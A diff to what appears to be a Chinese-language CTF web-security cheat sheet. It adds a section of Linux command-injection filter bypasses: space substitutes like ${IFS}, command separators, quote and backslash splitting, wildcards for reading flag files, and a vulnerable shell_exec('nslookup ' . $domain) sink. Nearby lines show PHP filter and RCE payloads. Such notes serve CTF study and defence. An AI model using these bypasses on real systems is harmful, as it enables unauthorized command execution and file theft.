@@ -376,6 +376,26 @@ include($a);
 php://filter/read=convert.base64-encode/resource=flag.php
 ```
 
+### 命令执行
+
+Linux下命令：
+
+- ls替代：`dir`
+- 空格绕过：`<`, `${IFS}`, `$IFS$9`, `%09`
+- cat命令替代：`more`, `tail`, `head`, `less`, `nl`, `sort`, `tailf`
+- 截断字符替代：`&&`, `||`, `;`, `%0a`, `|`
+- 反斜杠绕过：`ca\t fl\ag.txt`
+- 编码绕过：`echo 'a==' | base64 -d`
+- 单双引号绕过：`c'a't`, `c"a"t`
+- 通配符绕过：`f?ag`, `f*`, `f[a-z]ag`, `f{l,b}ag`
+
+```php
+shell_exec("nslookup " . $domain);
+// &quot;为"的html形式
+```
+
+
+
 ### 远程命令执行
 
 RCE，Remote Command Execution
@@ -394,7 +414,7 @@ what=print_r(scandir('../'));    // 查看上一目录所有文件和目录
 what=echo file_get_contents('filename.txt'); // 查看文件内容
 ```
 
-**无参函数RCE**
+**无参函数RCE** 
 
 ```PHP
 if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\/|zip:\/\//i', $cmd))
